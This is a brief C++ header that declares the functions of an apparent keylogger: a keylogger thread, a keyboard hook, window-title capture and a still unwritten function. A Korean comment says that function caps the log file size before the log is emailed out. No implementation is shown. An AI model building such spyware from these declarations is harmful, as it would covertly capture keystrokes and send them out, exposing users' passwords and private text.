#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"

using namespace std;

DWORD WINAPI Keylogger(LPVOID lpParm);
LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam);
void wintitle();

// TBD
void FSD();
// 로그 파일을 이메일로 전송하기전 최대 파일 사이지를 정해주는 함수..

